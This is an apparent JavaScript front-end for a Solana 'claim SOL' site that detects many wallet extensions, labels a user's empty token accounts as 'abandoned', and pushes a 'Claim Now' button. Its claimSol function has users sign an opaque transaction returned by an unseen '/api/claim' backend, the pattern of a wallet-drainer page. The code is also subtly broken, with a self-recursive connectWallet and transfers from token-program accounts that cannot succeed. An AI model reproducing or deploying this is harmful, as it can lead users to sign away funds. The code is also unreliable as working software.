class WalletManager {
    constructor() {
        this.connections = {
            mainnet: 'https://api.mainnet-beta.solana.com',
            devnet: 'https://api.devnet.solana.com',
            testnet: 'https://api.testnet.solana.com'
        };
        this.currentNetwork = 'mainnet';
        this.connection = new solanaWeb3.Connection(
            this.connections[this.currentNetwork],
            'confirmed'
        );
        this.publicKey = null;
        this.walletProviders = {
            phantom: window?.phantom?.solana,
            solflare: window?.solflare,
            slope: window?.slope,
            backpack: window?.backpack,
            glow: window?.glow,
            exodus: window?.exodus,
            coinbase: window?.coinbaseWalletExtension,
            brave: window?.braveSolana,
            degenWallet: window?.degenWallet,
            clover: window?.clover,
            math: window?.mathwallet
        };
        this.currentProvider = null;
        this.rateLimitMap = new Map();
        this.abandonedAccounts = [];
    }

    async detectWallets() {
        const availableWallets = {};
        for (const [name, provider] of Object.entries(this.walletProviders)) {
            if (provider) {
                availableWallets[name] = provider;
            }
        }
        return availableWallets;
    }

    async connectWallet(providerName) {
        try {
            this.showLoading('Connecting wallet...');
            const publicKey = await this.connectWallet(providerName);
            this.updateWalletUI(true, publicKey.toString());
            
            // Get and display account info
            const accountInfo = await this.getAccountInfo();
            this.updateAccountInfo(accountInfo);
            
            // Check for abandoned accounts
            if (accountInfo.abandonedAccounts.length > 0) {
                this.showAbandonedAccountsNotification(accountInfo.abandonedAccounts);
            }
            
            this.showNotification('Wallet connected successfully!', 'success');
        } catch (error) {
            this.showNotification(error.message, 'error');
        } finally {
            this.hideLoading();
        }
    }

    async findAbandonedAccounts() {
        try {
            const programIds = [
                'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA', // Token Program
                'ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL', // Associated Token Program
                // Add more program IDs as needed
            ];

            const accounts = await this.connection.getParsedProgramAccounts(
                new solanaWeb3.PublicKey(programIds[0]),
                {
                    filters: [
                        {
                            dataSize: 165, // Size of token account
                        },
                        {
                            memcmp: {
                                offset: 32,
                                bytes: this.publicKey.toBase58(),
                            },
                        },
                    ],
                }
            );

            this.abandonedAccounts = accounts.filter(acc => {
                const data = acc.account.data.parsed.info;
                return data.tokenAmount.uiAmount === 0;
            });

            return this.abandonedAccounts;
        } catch (error) {
            console.error('Error finding abandoned accounts:', error);
            throw this.handleError(error);
        }
    }

    async claimAbandonedAccounts() {
        if (!this.abandonedAccounts.length) {
            throw new Error('No abandoned accounts found');
        }

        try {
            const transaction = new solanaWeb3.Transaction();

            for (const account of this.abandonedAccounts) {
                transaction.add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: account.pubkey,
                        toPubkey: this.publicKey,
                        lamports: account.account.lamports,
                    })
                );
            }

            const signature = await this.currentProvider.signAndSendTransaction(transaction);
            await this.connection.confirmTransaction(signature);

            // Clear claimed accounts
            this.abandonedAccounts = [];
            return signature;
        } catch (error) {
            console.error('Error claiming accounts:', error);
            throw this.handleError(error);
        }
    }

    async getAccountInfo() {
        if (!this.publicKey) throw new Error('Wallet not connected');

        try {
            const info = await this.connection.getAccountInfo(this.publicKey);
            const tokenAccounts = await this.connection.getParsedTokenAccountsByOwner(
                this.publicKey,
                { programId: new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA') }
            );

            return {
                balance: info.lamports / solanaWeb3.LAMPORTS_PER_SOL,
                tokenAccounts: tokenAccounts.value,
                abandonedAccounts: this.abandonedAccounts
            };
        } catch (error) {
            console.error('Error getting account info:', error);
            throw this.handleError(error);
        }
    }

    async checkBalance() {
        if (!this.publicKey) throw new Error('Wallet not connected');
        
        try {
            // Use multiple RPC nodes for redundancy
            const rpcEndpoints = [
                this.connections[this.currentNetwork],
                'https://solana-api.projectserum.com',
                'https://solana-api.raydium.io'
            ];

            for (const endpoint of rpcEndpoints) {
                try {
                    const connection = new solanaWeb3.Connection(endpoint);
                    const balance = await connection.getBalance(this.publicKey);
                    return balance / solanaWeb3.LAMPORTS_PER_SOL;
                } catch (e) {
                    console.warn(`Failed to fetch balance from ${endpoint}`, e);
                    continue;
                }
            }
            throw new Error('Failed to fetch balance from all endpoints');
        } catch (error) {
            console.error('Balance check error:', error);
            throw this.handleError(error);
        }
    }

    async claimSol(amount) {
        if (!this.publicKey) throw new Error('Wallet not connected');
        if (this.isRateLimited('claim')) {
            throw new Error('Please wait before making another claim');
        }
        
        try {
            // Add your backend API call here
            const response = await fetch('/api/claim', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    wallet: this.publicKey.toString(),
                    amount,
                    network: this.currentNetwork
                })
            });

            if (!response.ok) {
                throw new Error('Claim request failed');
            }

            const data = await response.json();
            
            // Sign and send transaction
            const transaction = solanaWeb3.Transaction.from(
                Buffer.from(data.transaction, 'base64')
            );
            
            const signed = await this.currentProvider.signTransaction(transaction);
            const signature = await this.connection.sendRawTransaction(
                signed.serialize()
            );
            
            await this.connection.confirmTransaction(signature);
            
            return signature;
        } catch (error) {
            console.error('Claim error:', error);
            throw this.handleError(error);
        }
    }

    isRateLimited(action) {
        const now = Date.now();
        const lastAttempt = this.rateLimitMap.get(action);
        const cooldown = {
            connect: 1000, // 1 second
            claim: 5000    // 5 seconds
        };

        if (lastAttempt && now - lastAttempt < cooldown[action]) {
            return true;
        }

        this.rateLimitMap.set(action, now);
        return false;
    }

    handleError(error) {
        if (error.message.includes('403')) {
            return new Error('Network connection error. Please try again later.');
        }
        // Add more error handling cases
        return error;
    }

    setupNetworkListener() {
        if (this.currentProvider) {
            this.currentProvider.on('networkChanged', async (network) => {
                this.currentNetwork = network;
                this.connection = new solanaWeb3.Connection(
                    this.connections[this.currentNetwork]
                );
                // Update UI with network change
                document.dispatchEvent(new CustomEvent('networkChanged', {
                    detail: { network }
                }));
            });
        }
    }
}

// UI Components
class UI {
    constructor(walletManager) {
        this.wallet = walletManager;
        this.initializeUI();
    }

    async initializeUI() {
        // Detect available wallets
        const availableWallets = await this.wallet.detectWallets();
        this.updateWalletModal(availableWallets);

        // Setup wallet modal
        const connectWalletBtn = document.getElementById('wallet-connect');
        const modalOverlay = document.getElementById('wallet-modal-overlay');
        
        connectWalletBtn.addEventListener('click', () => {
            modalOverlay.classList.add('show');
        });

        modalOverlay.addEventListener('click', (e) => {
            if (e.target === modalOverlay) {
                modalOverlay.classList.remove('show');
            }
        });

        // Setup wallet options
        document.querySelectorAll('.wallet-option').forEach(option => {
            option.addEventListener('click', async () => {
                const walletName = option.dataset.wallet;
                await this.connectWallet(walletName);
                modalOverlay.classList.remove('show');
            });
        });

        // Setup network selector
        const networkSelect = document.getElementById('network-select');
        networkSelect.addEventListener('change', (e) => {
            this.wallet.currentNetwork = e.target.value;
            this.updateNetworkStatus(e.target.value);
        });
    }

    updateWalletModal(availableWallets) {
        const modalContent = document.querySelector('.wallet-modal');
        modalContent.innerHTML = '<h2>Connect Wallet</h2>';

        Object.entries(availableWallets).forEach(([name, provider]) => {
            const option = document.createElement('div');
            option.className = 'wallet-option';
            option.dataset.wallet = name;
            option.innerHTML = `
                <img src="assets/${name.toLowerCase()}.png" alt="${name}">
                <span>${name}</span>
                ${provider.isConnected ? '<span class="connected-badge">Connected</span>' : ''}
            `;
            modalContent.appendChild(option);
        });
    }

    async connectWallet(providerName) {
        try {
            this.showLoading('Connecting wallet...');
            const publicKey = await this.wallet.connectWallet(providerName);
            this.updateWalletUI(true, publicKey.toString());
            
            // Get and display account info
            const accountInfo = await this.wallet.getAccountInfo();
            this.updateAccountInfo(accountInfo);
            
            // Check for abandoned accounts
            if (accountInfo.abandonedAccounts.length > 0) {
                this.showAbandonedAccountsNotification(accountInfo.abandonedAccounts);
            }
            
            this.showNotification('Wallet connected successfully!', 'success');
        } catch (error) {
            this.showNotification(error.message, 'error');
        } finally {
            this.hideLoading();
        }
    }

    updateAccountInfo(info) {
        // Update balance
        const balanceElement = document.getElementById('wallet-balance');
        balanceElement.textContent = `${info.balance.toFixed(4)} SOL`;
        balanceElement.classList.remove('hidden');

        // Update token accounts
        const tokenListElement = document.createElement('div');
        tokenListElement.className = 'token-list';
        
        info.tokenAccounts.forEach(account => {
            const tokenInfo = account.account.data.parsed.info;
            const tokenElement = document.createElement('div');
            tokenElement.className = 'token-item';
            tokenElement.innerHTML = `
                <span class="token-name">${tokenInfo.mint}</span>
                <span class="token-amount">${tokenInfo.tokenAmount.uiAmount}</span>
            `;
            tokenListElement.appendChild(tokenElement);
        });

        // Update abandoned accounts section
        if (info.abandonedAccounts.length > 0) {
            const abandonedSection = document.createElement('div');
            abandonedSection.className = 'abandoned-accounts';
            abandonedSection.innerHTML = `
                <h3>Abandoned Accounts Found</h3>
                <p>${info.abandonedAccounts.length} accounts can be claimed</p>
                <button class="claim-button action-button">
                    Claim All (${info.abandonedAccounts.length})
                </button>
            `;
            
            abandonedSection.querySelector('.claim-button').addEventListener('click', () => {
                this.claimAbandonedAccounts();
            });
            
            document.querySelector('#hero').appendChild(abandonedSection);
        }
    }

    async claimAbandonedAccounts() {
        try {
            this.showLoading('Claiming accounts...');
            const signature = await this.wallet.claimAbandonedAccounts();
            
            // Update account info after claiming
            const accountInfo = await this.wallet.getAccountInfo();
            this.updateAccountInfo(accountInfo);
            
            this.showNotification('Accounts claimed successfully!', 'success');
            
            // Remove abandoned accounts section
            document.querySelector('.abandoned-accounts')?.remove();
        } catch (error) {
            this.showNotification(error.message, 'error');
        } finally {
            this.hideLoading();
        }
    }

    showAbandonedAccountsNotification(accounts) {
        const notification = document.createElement('div');
        notification.className = 'notification info';
        notification.innerHTML = `
            <i class="fas fa-info-circle"></i>
            <div class="notification-content">
                <h4>Abandoned Accounts Found!</h4>
                <p>You have ${accounts.length} accounts that can be claimed for SOL</p>
                <button class="claim-button">Claim Now</button>
            </div>
        `;
        
        notification.querySelector('.claim-button').addEventListener('click', () => {
            this.claimAbandonedAccounts();
            notification.remove();
        });
        
        document.body.appendChild(notification);
        setTimeout(() => notification.classList.add('show'), 100);
    }

    updateNetworkStatus(network) {
        const statusElement = document.querySelector('.network-status .network-name');
        statusElement.textContent = network.charAt(0).toUpperCase() + network.slice(1);
        
        // Update status dot color based on network
        const statusDot = document.querySelector('.network-status .status-dot');
        statusDot.className = `status-dot ${network}`;
    }

    showLoading(message) {
        const loadingElement = document.createElement('div');
        loadingElement.className = 'loading-overlay';
        loadingElement.innerHTML = `
            <div class="loading-spinner"></div>
            <p>${message}</p>
        `;
        document.body.appendChild(loadingElement);
    }

    hideLoading() {
        const loadingElement = document.querySelector('.loading-overlay');
        if (loadingElement) {
            loadingElement.remove();
        }
    }

    showNotification(message, type = 'info') {
        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        toast.innerHTML = `
            <i class="fas fa-${this.getNotificationIcon(type)}"></i>
            <div class="toast-content">
                <p>${message}</p>
            </div>
        `;
        
        document.querySelector('.toast-container').appendChild(toast);
        setTimeout(() => toast.classList.add('show'), 100);
        setTimeout(() => {
            toast.classList.remove('show');
            setTimeout(() => toast.remove(), 300);
        }, 3000);
    }

    getNotificationIcon(type) {
        const icons = {
            success: 'check-circle',
            error: 'exclamation-circle',
            info: 'info-circle',
            warning: 'exclamation-triangle'
        };
        return icons[type] || 'info-circle';
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const wallet = new WalletManager();
    const ui = new UI(wallet);
    
    // Smooth Scroll for Navigation Links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth'
                });
            }
        });
    });

    // Animation on Scroll
    const animateOnScroll = () => {
        const elements = document.querySelectorAll('.feature-card, .stat-item');
        elements.forEach(element => {
            const elementTop = element.getBoundingClientRect().top;
            const windowHeight = window.innerHeight;
            
            if (elementTop < windowHeight - 100) {
                element.style.opacity = '1';
                element.style.transform = 'translateY(0)';
            }
        });
    };

    // Initial animation state
    document.querySelectorAll('.feature-card, .stat-item').forEach(element => {
        element.style.opacity = '0';
        element.style.transform = 'translateY(20px)';
        element.style.transition = 'all 0.6s ease-out';
    });

    // Listen for scroll events
    window.addEventListener('scroll', animateOnScroll);
    animateOnScroll();
});
